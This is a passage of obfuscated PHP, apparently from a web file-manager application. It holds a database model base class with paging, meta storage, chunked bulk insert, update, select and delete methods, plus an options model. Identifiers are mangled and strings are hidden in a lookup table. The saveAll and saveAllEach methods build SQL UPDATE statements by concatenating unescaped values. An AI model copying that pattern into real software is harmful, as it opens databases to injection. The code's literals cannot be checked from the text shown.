$ÑÁĞ—¼¥); $ÑÁĞ—¼¥ = $ÑÁĞ—¼¥ <= 1 ? 1 : $ÑÁĞ—¼¥; $öúÏÑé = array(); $ªÙÑšáñ = 1; if ($ÑÁĞ—¼¥ == 1 && $ªÙÑšáñ) { $this->optionsValue($šòùŞ); $öúÏÑé = $this->page($ÑÁĞ—¼¥, $òÄ®–İ)->select(); $ÌÈ±áßË = is_array($öúÏÑé) ? count($öúÏÑé) : 0; if ($ÌÈ±áßË < $òÄ®–İ) { $î––æèÖ = 1; } else { $this->optionsValue($éâÚÉ¨¨); $ÌÈ±áßË = intval($this->count()); $î––æèÖ = ceil($ÌÈ±áßË / $òÄ®–İ); } } else { $this->optionsValue($éâÚÉ¨¨); $ÌÈ±áßË = intval($this->count()); $î––æèÖ = ceil($ÌÈ±áßË / $òÄ®–İ); $ÑÁĞ—¼¥ = $ÑÁĞ—¼¥ >= $î––æèÖ ? $î––æèÖ : $ÑÁĞ—¼¥; $this->optionsValue($šòùŞ); $öúÏÑé = $this->page($ÑÁĞ—¼¥, $òÄ®–İ)->select(); } if (!is_array($öúÏÑé)) { $öúÏÑé = array(); } if ($î––æèÖ == 1) { $ÌÈ±áßË = count($öúÏÑé); } $ŞŞœ¹ = array($Çõ»ùÑ[395] => array($Çõ»ùÑ[396] => $ÌÈ±áßË, $Çõ»ùÑ[392] => $òÄ®–İ, $Çõ»ùÑ[382] => $ÑÁĞ—¼¥, $Çõ»ùÑ[397] => $î––æèÖ), $Çõ»ùÑ[398] => $öúÏÑé); return $ŞŞœ¹; } protected function checkLength($µÆ­Ş®, $õáé€·³ = 0, $â§éƒœ– = '') { $—´ˆ¸„è =& $_SERVER[…É¦À–]; $õáé€·³ = $õáé€·³ ? $õáé€·³ : 65536; if (!$µÆ­Ş® || strlen($µÆ­Ş®) < $õáé€·³) { return; } $â§éƒœ– = $â§éƒœ– ? $â§éƒœ– . $—´ˆ¸„è[71] : $—´ˆ¸„è[12]; show_json($â§éƒœ– . LNG($—´ˆ¸„è[399]) . "\50{$õáé€·³}\51", !1); } protected function metaSet($•ö¿Öİ¾, $¯Œë‹°Œ = null, $»ë×´¡Ì = null) { $›şß„Ş‡ =& $_SERVER[…É¦À–]; if (!$this->tableMeta || !$•ö¿Öİ¾) { return !1; } $‹éÒæå³ = $this->tableMeta[$›şß„Ş‡[400]]; $Ü¶„¸Õõ = $this->tableMeta[$›şß„Ş‡[401]]; $·ÔÖ´ = Model($Ü¶„¸Õõ); $Êô²úá = array($‹éÒæå³ => $•ö¿Öİ¾, $›şß„Ş‡[402] => $¯Œë‹°Œ); if (is_null($¯Œë‹°Œ)) { return $·ÔÖ´->where(array($‹éÒæå³ => $•ö¿Öİ¾))->delete(); } if (is_null($»ë×´¡Ì) && is_string($¯Œë‹°Œ)) { return $·ÔÖ´->where($Êô²úá)->delete(); } $•ÎÁŒÊ = is_array($¯Œë‹°Œ) ? $¯Œë‹°Œ : array(); if (is_string($¯Œë‹°Œ)) { $•ÎÁŒÊ[$¯Œë‹°Œ] = $»ë×´¡Ì; } $…‘¨¬Ø¿ = array(); foreach ($•ÎÁŒÊ as $±û˜‡ê° => $ƒ´èöú½) { if (is_null($ƒ´èöú½) && is_string($±û˜‡ê°)) { $·ÔÖ´->where(array($‹éÒæå³ => $•ö¿Öİ¾, $›şß„Ş‡[402] => $±û˜‡ê°))->delete(); continue; } $this->checkLength($ƒ´èöú½, !1, $Ü¶„¸Õõ . $›şß„Ş‡[4] . $±û˜‡ê°); $…‘¨¬Ø¿[] = array($‹éÒæå³ => $•ö¿Öİ¾, $›şß„Ş‡[94] => $±û˜‡ê°, $›şß„Ş‡[403] => $ƒ´èöú½); } $ºçä¯ê¯ = $›şß„Ş‡[404] . $Ü¶„¸Õõ; CacheLock::lock($ºçä¯ê¯); $·ÔÖ´->where(array($‹éÒæå³ => $•ö¿Öİ¾))->addAll($…‘¨¬Ø¿, array(), !0); CacheLock::unlock($ºçä¯ê¯); return !0; } public function metaGet($ßûŞ¤üÔ, $ò„²´Äû = false) { $á‚ëÚÖƒ =& $_SERVER[…É¦À–]; if (!$this->tableMeta) { return array(); } $àœß·ÙÑ = $this->tableMeta[$á‚ëÚÖƒ[400]]; $˜äÇüØÓ = Model($this->tableMeta[$á‚ëÚÖƒ[401]]); if ($ò„²´Äû) { $¬‡«âÃ“ = array($àœß·ÙÑ => $ßûŞ¤üÔ, $á‚ëÚÖƒ[94] => $ò„²´Äû); return $˜äÇüØÓ->where($¬‡«âÃ“)->getField($á‚ëÚÖƒ[403]); } $¬‡«âÃ“ = array($àœß·ÙÑ => $ßûŞ¤üÔ); $§ï„ØôÎ = $˜äÇüØÓ->field($á‚ëÚÖƒ[405])->where($¬‡«âÃ“)->select(); $§ï„ØôÎ = array_to_keyvalue($§ï„ØôÎ, $á‚ëÚÖƒ[94], $á‚ëÚÖƒ[403]); return $§ï„ØôÎ; } private function checkDataAutoHas($‘û½ó) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $÷º¿î¯è) { if (in_array($‘û½ó, explode($_SERVER[…É¦À–][50], $÷º¿î¯è[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$¸ò×¶öæ, $ƒşƒßĞ¼) { $×¦ŠÎ…Í =& $_SERVER[…É¦À–]; if (!is_array($¸ò×¶öæ)) { return; } foreach ($this->dataAuto as $ó—İ‚¨) { $ÊÜ¬Ğ˜„ = $ó—İ‚¨[0]; if (!in_array($ƒşƒßĞ¼, explode($×¦ŠÎ…Í[50], $ó—İ‚¨[2]))) { continue; } switch (trim($ó—İ‚¨[3])) { case $×¦ŠÎ…Í[350]: case $×¦ŠÎ…Í[351]: $ÖŞ»Õë¡ = $ó—İ‚¨[1]; $¯ªæ¿´Ş = isset($ó—İ‚¨[4]) ? (array) $ó—İ‚¨[4] : array(); if ($ÖŞ»Õë¡ == $×¦ŠÎ…Í[180] && array_key_exists($ÊÜ¬Ğ˜„, $¸ò×¶öæ)) { if (!$¸ò×¶öæ[$ÊÜ¬Ğ˜„]) { unset($¸ò×¶öæ[$ÊÜ¬Ğ˜„]); } break; } if (isset($¸ò×¶öæ[$ÊÜ¬Ğ˜„])) { array_unshift($¯ªæ¿´Ş, $¸ò×¶öæ[$ÊÜ¬Ğ˜„]); } if ($×¦ŠÎ…Í[350] == $ó—İ‚¨[3]) { $¸ò×¶öæ[$ÊÜ¬Ğ˜„] = call_user_func_array($ÖŞ»Õë¡, $¯ªæ¿´Ş); } else { $¸ò×¶öæ[$ÊÜ¬Ğ˜„] = call_user_func_array(array(&$this, $ÖŞ»Õë¡), $¯ªæ¿´Ş); } break; case $×¦ŠÎ…Í[299]: if (isset($¸ò×¶öæ[$ÊÜ¬Ğ˜„]) && $¸ò×¶öæ[$ÊÜ¬Ğ˜„]) { $¸ò×¶öæ[$ÊÜ¬Ğ˜„] = call_user_func_array(array(&$this, $ó—İ‚¨[1]), array($¸ò×¶öæ[$ÊÜ¬Ğ˜„])); } break; case $×¦ŠÎ…Í[302]: $¸ò×¶öæ[$ÊÜ¬Ğ˜„] = $¸ò×¶öæ[$ó—İ‚¨[1]]; break; case $×¦ŠÎ…Í[323]: if (isset($¸ò×¶öæ[$ÊÜ¬Ğ˜„]) && !is_string($¸ò×¶öæ[$ÊÜ¬Ğ˜„])) { $¸ò×¶öæ[$ÊÜ¬Ğ˜„] = json_encode_force($¸ò×¶öæ[$ÊÜ¬Ğ˜„]); } break; case $×¦ŠÎ…Í[352]: if ($¸ò×¶öæ[$ÊÜ¬Ğ˜„] === $×¦ŠÎ…Í[12]) { unset($¸ò×¶öæ[$ÊÜ¬Ğ˜„]); } break; case $×¦ŠÎ…Í[353]: $¸ò×¶öæ[$ÊÜ¬Ğ˜„] = $ó—İ‚¨[1]; default: break; } } if ($ƒşƒßĞ¼ == $×¦ŠÎ…Í[384]) { $İÛ“ÍÎ = strtolower($this->db->getDbType()); if (strpos($İÛ“ÍÎ, $×¦ŠÎ…Í[13]) !== 0) { return; } $“ÜÌàå = $this->field(!0)->fields; $şõÃàø© = $“ÜÌàå[$×¦ŠÎ…Í[281]]; if (isset($“ÜÌàå[$×¦ŠÎ…Í[280]])) { unset($şõÃàø©[$“ÜÌàå[$×¦ŠÎ…Í[280]]]); } foreach ($şõÃàø© as $Ç¨û’‰ => $ƒşƒßĞ¼) { if (!isset($¸ò×¶öæ[$Ç¨û’‰])) { $¸ò×¶öæ[$Ç¨û’‰] = $×¦ŠÎ…Í[12]; } } } } private function dataAfterFilter(&$åÈÌµ€Å) { $†•óØÆ› =& $_SERVER[…É¦À–]; foreach ($this->dataAuto as $é·‚î†ª) { $áÁ½Çº” = $é·‚î†ª[0]; if (!isset($åÈÌµ€Å[$áÁ½Çº”])) { continue; } if (!in_array($†•óØÆ›[386], explode($†•óØÆ›[50], $é·‚î†ª[2]))) { continue; } switch (trim($é·‚î†ª[3])) { case $†•óØÆ›[350]: case $†•óØÆ›[351]: $ÖŸ¯—õ· = isset($é·‚î†ª[4]) ? (array) $é·‚î†ª[4] : array(); array_unshift($ÖŸ¯—õ·, $åÈÌµ€Å[$áÁ½Çº”]); if (isset($é·‚î†ª[4]) && $é·‚î†ª[4] == $†•óØÆ›[406]) { $ÖŸ¯—õ· = array($åÈÌµ€Å[$áÁ½Çº”]); } if ($†•óØÆ›[350] == $é·‚î†ª[3]) { $åÈÌµ€Å[$áÁ½Çº”] = call_user_func_array($é·‚î†ª[1], $ÖŸ¯—õ·); } else { $åÈÌµ€Å[$áÁ½Çº”] = call_user_func_array(array(&$this, $é·‚î†ª[1]), $ÖŸ¯—õ·); } break; case $†•óØÆ›[299]: if (isset($åÈÌµ€Å[$áÁ½Çº”]) && $åÈÌµ€Å[$áÁ½Çº”]) { $åÈÌµ€Å[$áÁ½Çº”] = call_user_func_array(array(&$this, $é·‚î†ª[1]), array($åÈÌµ€Å[$áÁ½Çº”])); } break; case $†•óØÆ›[302]: $åÈÌµ€Å[$áÁ½Çº”] = $åÈÌµ€Å[$é·‚î†ª[1]]; break; case $†•óØÆ›[323]: $ıêÛ—µà = $åÈÌµ€Å[$áÁ½Çº”]; $åÈÌµ€Å[$áÁ½Çº”] = json_decode($ıêÛ—µà, !0); if (is_null($åÈÌµ€Å[$áÁ½Çº”])) { $åÈÌµ€Å[$áÁ½Çº”] = $ıêÛ—µà; } break; case $†•óØÆ›[352]: if ($åÈÌµ€Å[$áÁ½Çº”] === $†•óØÆ›[12]) { unset($åÈÌµ€Å[$áÁ½Çº”]); } break; case $†•óØÆ›[353]: $åÈÌµ€Å[$áÁ½Çº”] = $é·‚î†ª[1]; break; default: break; } } } public function saveAll($§úıù­Ã) { $İ¯…÷£ö =& $_SERVER[…É¦À–]; $•­Ã¾Óä = $this->tablePrefix . $this->tableName; $«²èˆ¶ = self::SQL_WHERE_IN_CHUNK; $§úıù­Ã = is_array($§úıù­Ã) ? $§úıù­Ã : array(); $ÇÄ´êã = $İ¯…÷£ö[407]; $ãşóÔŠé = 0; $™ˆÂËš = array(); $Ãøˆ‡¬ = count($§úıù­Ã); for ($¬ˆúâß® = 0; $¬ˆúâß® < $Ãøˆ‡¬; $¬ˆúâß®++) { $àÂé¬Ä = $§úıù­Ã[$¬ˆúâß®]; if (!is_array($àÂé¬Ä) || count($àÂé¬Ä) != 4) { continue; } $ç‡è‡±Î = "\125\120\104\x41\124\105\40\x60{$•­Ã¾Óä}\140\40\x53\x45\x54\40{$àÂé¬Ä[2]}\40\75\40\103\x41\123\105\x20{$àÂé¬Ä[0]}\x20\xa"; if ($ãşóÔŠé == 0) { $ÇÄ´êã = $ç‡è‡±Î; } $™ˆÂËš[] = $İ¯…÷£ö[118] . $àÂé¬Ä[1] . $İ¯…÷£ö[118]; $ãşóÔŠé++; $ÇÄ´êã .= "\x20\127\x48\x45\116\40\x27{$àÂé¬Ä[1]}\47\40\x54\x48\x45\x4e\x20\47{$àÂé¬Ä[3]}\47\x20\xa"; if ($ãşóÔŠé == $«²èˆ¶ || $¬ˆúâß® == $Ãøˆ‡¬ - 1) { $›Íˆàå» = implode($İ¯…÷£ö[50], $™ˆÂËš); $ÇÄ´êã .= "\x20\105\x4e\104\x20\x20\x57\110\105\x52\105\x20{$àÂé¬Ä[0]}\x20\111\116\x20\x28{$›Íˆàå»}\x29\40"; $this->execute($ÇÄ´êã); $ãşóÔŠé = 0; $ÇÄ´êã = $ç‡è‡±Î; $this->chunkEventCheck(count($™ˆÂËš)); $™ˆÂËš = array(); } } $this->chunkEventSet(); } public function saveAllEach($ºäË¿À) { $Ÿé¬è÷÷ =& $_SERVER[…É¦À–]; $ëÙ°¸Ë = $this->tablePrefix . $this->tableName; foreach ($ºäË¿À as $´”óÒ²¨) { if (!is_array($´”óÒ²¨) || count($´”óÒ²¨) != 4) { continue; } $ÎÏ•¼÷™ = $´”óÒ²¨[0] . $Ÿé¬è÷÷[408] . $´”óÒ²¨[1] . $Ÿé¬è÷÷[118]; $›¯Äƒõ = $´”óÒ²¨[2] . $Ÿé¬è÷÷[408] . $´”óÒ²¨[3] . $Ÿé¬è÷÷[118]; $»¾ÅÉª† = "\165\160\144\141\164\x65\40{$ëÙ°¸Ë}\x20\163\145\x74\40{$›¯Äƒõ}\40\167\150\x65\x72\145\x20{$ÎÏ•¼÷™}\73"; $this->execute($»¾ÅÉª†); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($¯Ä»µ·ã = false, $€œ‘²¢¥ = false) { $this->_chunkEvent = $¯Ä»µ·ã; $this->_chunkEventParam = $€œ‘²¢¥; } private function chunkEventCheck($Ìø“’±) { if (!$this->_chunkEvent) { return; } $êó®õÃç = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $êó®õÃç[$_SERVER[…É¦À–][409]] = $Ìø“’±; Hook::trigger($this->_chunkEvent, $êó®õÃç); } public function addAll($ÉŸíÉ¶±, $öÊºÓ‡Ö = array(), $»²â±À = false) { $Œ½õÏ‡ú =& $_SERVER[…É¦À–]; ignore_timeout(); $ö¦ºğ = self::SQL_WHERE_IN_CHUNK; if (empty($ÉŸíÉ¶±)) { $this->error = think_lang($Œ½õÏ‡ú[300]); return !1; } $öÊºÓ‡Ö = $this->_parseOptions($öÊºÓ‡Ö); foreach ($ÉŸíÉ¶± as $Š³âƒîö => $¤êºØó’) { $ÉŸíÉ¶±[$Š³âƒîö] = $this->_facade($¤êºØó’); $this->_beforeInsert($ÉŸíÉ¶±[$Š³âƒîö], $öÊºÓ‡Ö); } if (method_exists($this->db, $Œ½õÏ‡ú[301])) { for ($»ï¬ÉË¤ = 0; $»ï¬ÉË¤ < count($ÉŸíÉ¶±); $»ï¬ÉË¤ += $ö¦ºğ) { $´±íÁÉ = array_slice($ÉŸíÉ¶±, $»ï¬ÉË¤, $ö¦ºğ); if (!is_array($´±íÁÉ) || count($´±íÁÉ) == 0) { break; } $’¼Öûäî = $this->db->insertAll($´±íÁÉ, $öÊºÓ‡Ö, $»²â±À); $this->chunkEventCheck(count($´±íÁÉ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ÉŸíÉ¶± as $Š³âƒîö => $¤êºØó’) { $’¼Öûäî = $this->db->insert($¤êºØó’, $öÊºÓ‡Ö, $»²â±À); } $this->commit(); } if (!1 !== $’¼Öûäî) { $ªÁ¨½©Ó = $this->getLastInsID(); if ($ªÁ¨½©Ó) { return $ªÁ¨½©Ó; } } return $’¼Öûäî; } public function save($ì£Û¯ÕŠ = '', $º ¬ó§Î = array()) { $±†³êÊ¼ =& $_SERVER[…É¦À–]; $éÄ–’À­ = self::SQL_WHERE_IN_CHUNK; $æ›´ò¹ = $this->optionsValue(); $³î Í³ = $this->findWhereField($æ›´ò¹); if (!$³î Í³) { return parent::save($ì£Û¯ÕŠ, $º ¬ó§Î); } $Äİè¨×Û = 0; $Âå Áã˜ = $æ›´ò¹[$±†³êÊ¼[304]][$³î Í³][1]; $Âå Áã˜ = is_array($Âå Áã˜) ? $Âå Áã˜ : array(); $“ë¼şÖé = count($Âå Áã˜); for ($ïşÄøË¬ = 0; $ïşÄøË¬ < $“ë¼şÖé; $ïşÄøË¬ += $éÄ–’À­) { $ßëñÆû“ = array_slice($Âå Áã˜, $ïşÄøË¬, $éÄ–’À­); if (!is_array($ßëñÆû“) || count($ßëñÆû“) == 0) { break; } $æ›´ò¹[$±†³êÊ¼[304]][$³î Í³][1] = $ßëñÆû“; $this->optionsValue($æ›´ò¹); $Äİè¨×Û += parent::save($ì£Û¯ÕŠ, $º ¬ó§Î); $this->chunkEventCheck(count($ßëñÆû“)); } $this->chunkEventSet(); return $Äİè¨×Û; } public function add($Áï·Ë™³ = '', $Á‡©Ë‰î = array(), $áôÛ¸ÕŞ = false) { if ($this->addTaskStatus && is_array($Áï·Ë™³)) { $this->addTaskData[] = $Áï·Ë™³; return; } return parent::add($Áï·Ë™³, $Á‡©Ë‰î, $áôÛ¸ÕŞ); } public function parseWhereLike($šêûø³·, $”áĞî¢ƒ = '', $­ Ó³• = false, &$ñª»”Óø = false) { $Æøµ¶€Ê =& $_SERVER[…É¦À–]; $¥‚Ò¾é = $GLOBALS[$Æøµ¶€Ê[6]][$Æøµ¶€Ê[410]]; if (!$¥‚Ò¾é[$Æøµ¶€Ê[411]]) { return $šêûø³·; } if (!is_array($šêûø³·)) { return $šêûø³·; } $‰Ö¸ïÒ = array(); $í£„½‚Å = 0; foreach ($šêûø³· as $›¹…Ê¶õ => $ßà³‡ÅÒ) { if (is_array($ßà³‡ÅÒ) && count($ßà³‡ÅÒ) == 2 && $ßà³‡ÅÒ[0] == $Æøµ¶€Ê[412] && is_string($ßà³‡ÅÒ[1]) && substr($ßà³‡ÅÒ[1], 0, 1) == $Æøµ¶€Ê[413] && substr($ßà³‡ÅÒ[1], strlen($ßà³‡ÅÒ[1]) - 1, 1) == $Æøµ¶€Ê[413]) { $ñª»”Óø = !0; $Ï€›®ğÕ = is_string($›¹…Ê¶õ) ? $›¹…Ê¶õ : $”áĞî¢ƒ; $±ÇĞ¶˜ = substr($ßà³‡ÅÒ[1], 1, strlen($ßà³‡ÅÒ[1]) - 2); $±ÇĞ¶˜ = $this->db->escapeString($±ÇĞ¶˜); if (!strpos($Ï€›®ğÕ, $Æøµ¶€Ê[10])) { $Ï€›®ğÕ = $Æøµ¶€Ê[414] . $Ï€›®ğÕ . $Æøµ¶€Ê[414]; } $¡Î“’‹¤ = $Æøµ¶€Ê[189] . $±ÇĞ¶˜ . $Æøµ¶€Ê[189]; $±ÇĞ¶˜ = str_replace(array($Æøµ¶€Ê[10], $Æøµ¶€Ê[415], $Æøµ¶€Ê[11]), $Æøµ¶€Ê[416], $±ÇĞ¶˜); if ($¥‚Ò¾é[$Æøµ¶€Ê[417]]) { $¡Î“’‹¤ = $Æøµ¶€Ê[418] . $±ÇĞ¶˜ . $Æøµ¶€Ê[419]; if ($¥‚Ò¾é[$Æøµ¶€Ê[420]]) { $¡Î“’‹¤ = $Æøµ¶€Ê[419] . $±ÇĞ¶˜ . $Æøµ¶€Ê[418]; } } $‰Ö¸ïÒ[$í£„½‚Å] = $Æøµ¶€Ê[421] . $Ï€›®ğÕ . $Æøµ¶€Ê[422] . $¡Î“’‹¤ . $Æøµ¶€Ê[423]; $í£„½‚Å++; continue; } if (is_array($ßà³‡ÅÒ)) { $”áĞî¢ƒ = is_string($›¹…Ê¶õ) ? $›¹…Ê¶õ : $”áĞî¢ƒ; $ßà³‡ÅÒ = $this->parseWhereLike($ßà³‡ÅÒ, $”áĞî¢ƒ, !0, $ñª»”Óø); } if (is_numeric($›¹…Ê¶õ)) { $‰Ö¸ïÒ[$í£„½‚Å] = $ßà³‡ÅÒ; $í£„½‚Å++; } else { $‰Ö¸ïÒ[$›¹…Ê¶õ] = $ßà³‡ÅÒ; } } if ($ñª»”Óø && !$­ Ó³•) { } return $‰Ö¸ïÒ; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($ıƒÁ¼ì§ = array()) { $’‚ñÔÂş =& $_SERVER[…É¦À–]; $°Ğ†›› = self::SQL_WHERE_IN_CHUNK; $Áˆš’¯Ç = $this->optionsValue(); $«Í¶äÁ = $this->findWhereField($Áˆš’¯Ç); if (!$«Í¶äÁ || isset($Áˆš’¯Ç[$’‚ñÔÂş[321]]) || isset($Áˆš’¯Ç[$’‚ñÔÂş[382]])) { return parent::select($ıƒÁ¼ì§); } $ÕÙÆÃ¹‡ = $Áˆš’¯Ç[$’‚ñÔÂş[304]][$«Í¶äÁ][1]; $ÕÙÆÃ¹‡ = is_array($ÕÙÆÃ¹‡) ? $ÕÙÆÃ¹‡ : array(); $ÌªóÀ»‡ = null; for ($öÂšß‹Ä = 0; $öÂšß‹Ä < count($ÕÙÆÃ¹‡); $öÂšß‹Ä += $°Ğ†››) { $²‹½§É¶ = array_slice($ÕÙÆÃ¹‡, $öÂšß‹Ä, $°Ğ†››); if (!is_array($²‹½§É¶) || count($²‹½§É¶) == 0) { break; } $Áˆš’¯Ç[$’‚ñÔÂş[304]][$«Í¶äÁ][1] = $²‹½§É¶; $this->optionsValue($Áˆš’¯Ç); $†›ö«É = parent::select($ıƒÁ¼ì§); if (!$†›ö«É) { continue; } $ÌªóÀ»‡ = is_array($ÌªóÀ»‡) ? $ÌªóÀ»‡ : array(); $ÌªóÀ»‡ = array_merge($ÌªóÀ»‡, $†›ö«É); } return $ÌªóÀ»‡; } public function delete($–€Á·ª  = array()) { $ˆ»—ßÓÒ =& $_SERVER[…É¦À–]; $Õ¬éğ´ = self::SQL_WHERE_IN_CHUNK; $…×¬©ó = $this->optionsValue(); $ÓÊçà»î = $this->findWhereField($…×¬©ó); if (!$ÓÊçà»î) { return parent::delete($–€Á·ª ); } $¯©Ù¶–§ = 0; $ÊùóÊíÙ = $…×¬©ó[$ˆ»—ßÓÒ[304]][$ÓÊçà»î][1]; $ÊùóÊíÙ = is_array($ÊùóÊíÙ) ? $ÊùóÊíÙ : array(); for ($ºÁĞÌÜé = 0; $ºÁĞÌÜé < count($ÊùóÊíÙ); $ºÁĞÌÜé += $Õ¬éğ´) { $Š³…¬ = array_slice($ÊùóÊíÙ, $ºÁĞÌÜé, $Õ¬éğ´); if (!is_array($Š³…¬) || count($Š³…¬) == 0) { break; } $…×¬©ó[$ˆ»—ßÓÒ[304]][$ÓÊçà»î][1] = $Š³…¬; $this->optionsValue($…×¬©ó); $¯©Ù¶–§ += parent::delete($–€Á·ª ); } return $¯©Ù¶–§; } private function findWhereField($˜’Šº´) { $¯Ä§½¿æ =& $_SERVER[…É¦À–]; $á¡ì¯˜ã = self::SQL_WHERE_IN_CHUNK; if (!is_array($˜’Šº´) || !is_array($˜’Šº´[$¯Ä§½¿æ[304]])) { return !1; } foreach ($˜’Šº´[$¯Ä§½¿æ[304]] as $ûÒ•Ã¯û => $Ë¬åŠ×Ì) { if (is_array($Ë¬åŠ×Ì) && isset($Ë¬åŠ×Ì[0]) && is_string($Ë¬åŠ×Ì[0]) && strtolower($Ë¬åŠ×Ì[0]) == $¯Ä§½¿æ[7] && is_array($Ë¬åŠ×Ì[1]) && count($Ë¬åŠ×Ì[1]) > $á¡ì¯˜ã) { ignore_timeout(); return $ûÒ•Ã¯û; } } return !1; } public function setMasterDB($„çØ…³Š = true) { think_config($_SERVER[…É¦À–][424], $„çØ…³Š); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\171\x73\164\145\x6d\x4f\x70\x74\151\x6f\x6e"; public $field = array(); public function listData($œ†ûß¶— = false, $ëñßÇç = "\x6d\157\144\x69\x66\x79\124\x69\155\x65", $âÛÁŸ½³ = false) { $ËÆÂ¸ğ = Model($this->modelType)->get(!1, $this->optionType, !0); $âøÀÜ°— = array_values($ËÆÂ¸ğ); if ($âøÀÜ°— && $âøÀÜ°—[0] && !is_array($âøÀÜ°—[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ËÆÂ¸ğ = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ËÆÂ¸ğ) { return $œ†ûß¶— ? null : array(); } if (!$œ†ûß¶—) { $ËÆÂ¸ğ = array_filter(array_values($ËÆÂ¸ğ)); return array_sort_by($ËÆÂ¸ğ, $ëñßÇç, $âÛÁŸ½³); } return $ËÆÂ¸ğ[$_SERVER[…É¦À–][425] . $œ†ûß¶—]; } public function insert($Ä…¦¦¼) { $éê¿Èœ€ =& $_SERVER[…É¦À–]; $Ä…¦¦¼ = array_field_key($Ä…¦¦¼, $this->field); $ŠÊÖ˜¬ò = Model($this->modelType)->get($éê¿Èœ€[426], $this->optionType . $éê¿Èœ€[427]); $ŠÊÖ˜¬ò = $ŠÊÖ˜¬ò ? $ŠÊÖ˜¬ò : 0; $Ä…¦¦¼[$éê¿Èœ€[428]] = ++$ŠÊÖ˜¬ò; $Ä…¦¦¼[$éê¿Èœ€[201]] = time(); $Ä…¦¦¼[$éê¿Èœ€[85]] = time(); Model($this->modelType)->set($éê¿Èœ€[426], $ŠÊÖ˜¬ò, $this->optionType . $éê¿Èœ€[427]); Model($this->modelType)->set($éê¿Èœ€[425] . $ŠÊÖ˜¬ò, $Ä…¦¦¼, $this->optionType); return $ŠÊÖ˜¬ò; } public function update($êğì€­‹, $‡àÅË–³) { $ïíĞÑ«» =& $_SERVER[…É¦À–]; $‡àÅË–³ = array_field_key($‡àÅË–³, $this->field); $‚¬Î¶¦Ğ = $this->listData($êğì€­‹); if (!$‚¬Î¶¦Ğ || !$êğì€­‹) { return !1; } $‡àÅË–³ = array_merge($‚¬Î¶¦Ğ, $‡àÅË–³); $‡àÅË–³[$ïíĞÑ«»[85]] = time(); return Model($this->modelType)->set($ïíĞÑ«»[425] . $êğì€­‹, $‡àÅË–³, $this->optionType); } public function remove($ˆìÊóç) { if (!$ˆìÊóç) { return !1; } return Model($this->modelType)->remove($_SERVER[…É¦À–][425] . $ˆìÊóç, $this->optionType); } public function clear() { $Ÿ±õš²± =& $_SERVER[…É¦À–]; Model($this->modelType)->remove($Ÿ±õš²±[426], $this->optionType . $Ÿ±õš²±[427]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($Æ±ÔšÒ, $Ÿ€„·¼Ò) { if (!$Ÿ€„·¼Ò) { return !1; } $´ÎÀî‹ = $this->listData(); $´ÎÀî‹ = array_to_keyvalue($´ÎÀî‹, $Æ±ÔšÒ); return isset($´ÎÀî‹[$Ÿ€„·¼Ò]) ? $´ÎÀî‹[$Ÿ€„·¼Ò] : !1; } public function findByName($»”½Å®²) { return $this->findByKey($_SERVER[…É¦À–][32], $»”½Å®²); } protected function resetData($ÏøİÅÀ) { $–µßßÚ¿ =& $_SERVER[…É¦À–]; $ÏøİÅÀ = is_array($ÏøİÅÀ) ? $ÏøİÅÀ : array(); $—ëû‘¥î = array(); for ($–•Œß¿· = 0; $–•Œß¿· < count($ÏøİÅÀ); $–•Œß¿·++) { $—ëû‘¥î[$–µßßÚ¿[425] . $ÏøİÅÀ[$–•Œß¿·][$–µßßÚ¿[428]]] = $ÏøİÅÀ[$–•Œß¿·]; } return Model($this->modelType)->set($—ëû‘¥î, !1, $this->optionType); } private function getAutoName($ş‹éÖ) { $×Í–Ìöõ = array_to_keyvalue($this->listData(), $_SERVER[…É¦À–][32]); if (!$×Í–Ìöõ || !isset($×Í–Ìöõ[$ş‹éÖ])) { return $ş‹éÖ; } for ($Æı¼“¶‹ = 1; $Æı¼“¶‹ < count($×Í–Ìöõ); $Æı¼“¶‹++) { $Ğ•¬Š‚ = $ş‹éÖ . "\50{$Æı¼“¶‹}\x29"; if (!isset($×Í–Ìöõ[$Ğ•¬Š‚])) { return $Ğ•¬Š‚; } } return $Ğ•¬Š‚; } } goto BŒâèõ ©Æ; bÚ‹†¡ÙÕ: class SourceHistoryModel extends ModelBase { protected $tableName = "\x69\157\x5f\163\157\x75\162\143\145\137\x68\x69\163\164\157\162\171"; public function historyCount($ÑåœĞøí) { $À´ùß­‹ =& $_SERVER[…É¦À–]; if (!$ÑåœĞøí) { return array(); } if (is_string($ÑåœĞøí) || is_int($ÑåœĞøí)) { $ÑåœĞøí = array($ÑåœĞøí); } $“Õı‰Ïï = array($À´ùß­‹[431], $À´ùß­‹[1910] => $À´ùß­‹[520]); $–¾¦à‡ = array($À´ùß­‹[431] => array($À´ùß­‹[7], $ÑåœĞøí)); $‚”³¡§Õ = $this->field($“Õı‰Ïï)->where($–¾¦à‡)->group($À´ùß­‹[431])->select(); return array_to_keyvalue($‚”³¡§Õ, $À´ùß­‹[431], $À´ùß­‹[520]); } public function addHistory($¶Ä“¨Ì, $ëÕŸ¢íé = '') { $ÀİË´Ï” =& $_SERVER[…É¦À–]; $úÊÇĞ™Å = array($ÀİË´Ï”[446] => $¶Ä“¨Ì[$ÀİË´Ï”[431]], $ÀİË´Ï”[1678] => isset($¶Ä“¨Ì[$ÀİË´Ï”[485]]) ? $¶Ä“¨Ì[$ÀİË´Ï”[485]] : $¶Ä“¨Ì[$ÀİË´Ï”[483]], $ÀİË´Ï”[498] => $¶Ä“¨Ì[$ÀİË´Ï”[497]], $ÀİË´Ï”[574] => $¶Ä“¨Ì[$ÀİË´Ï”[76]], $ÀİË´Ï”[2121] => $ëÕŸ¢íé); if ($GLOBALS[$ÀİË´Ï”[6]][$ÀİË´Ï”[89]][$ÀİË´Ï”[1262]] >= 1) { $this->historyAutoClear($úÊÇĞ™Å[$ÀİË´Ï”[431]]); $this->add($úÊÇĞ™Å); 